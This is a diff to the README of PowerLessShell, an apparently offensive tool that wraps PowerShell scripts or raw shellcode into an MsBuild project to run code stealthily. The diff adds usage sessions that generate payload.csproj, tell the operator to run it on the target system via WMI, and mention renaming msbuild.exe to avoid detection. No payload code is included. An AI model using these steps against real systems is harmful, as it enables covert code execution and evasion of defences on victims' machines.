@@ -9,7 +9,7 @@ To add another layer of crap the payload will copy msbuild.exe to something rand
 
 # Usage
 
-Attacker side
+Raw shellcode
 ```
 $ python PowerLessShell.py
 
@@ -31,8 +31,9 @@ PowerLessShell - Remain Stealth
         `----^----"
 
 
+(Set payload type 'powershell, shellcode')>>> shellcode
 
-(Path to the PowerShell script)>>> powershell.ps1
+(Path to the raw shellcode file)>>> shellcode.raw
 
 (Path for the generated MsBuild out file)>>> payload.csproj
 
@@ -43,9 +44,45 @@ PowerLessShell - Remain Stealth
 [+] Run the command inside of payload.csproj.cmd on the target system using WMI.
 ```
 
+Powershell
+```
+$ python PowerLessShell.py
+
+
+PowerLessShell - Remain Stealth
+         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team
+            ___
+        .-"; ! ;"-.
+      .'!  : | :  !`.
+     /\  ! : ! : !  /\
+    /\ |  ! :|: !  | /\
+   (  \ \ ; :!: ; / /  )
+  ( `. \ | !:|:! | / .' )
+  (`. \ \ \!:|:!/ / / .')
+   \ `.`.\ |!|! |/,'.' /
+    `._`.\\!!!// .'_.'
+       `.`.\|//.'.'
+        |`._`n'_.'|
+        `----^----"
+
+
+(Set payload type 'powershell, shellcode')>>> powershell
+
+(Path to the PowerShell script)>>> payload.ps1
+
+(Path for the generated MsBuild out file)>>> payload.csproj
+
+(Use known process name to perform MsBuild renaming (Default: False))>>>
+
+[+] payload.csproj was generated.
+[+] payload.csproj.cmd was generated.
+[+] Run the command inside of payload.csproj.cmd on the target system using WMI.
+```
+
+
 Inline command
 ```
-python PowerLessShell.py powershell.ps1 output (optional -knownprocess) optional (shellcode)
+python PowerLessShell.py powershell.ps1 output (optional shellcode, -knownprocess)
 
 
 PowerLessShell - Remain Stealth
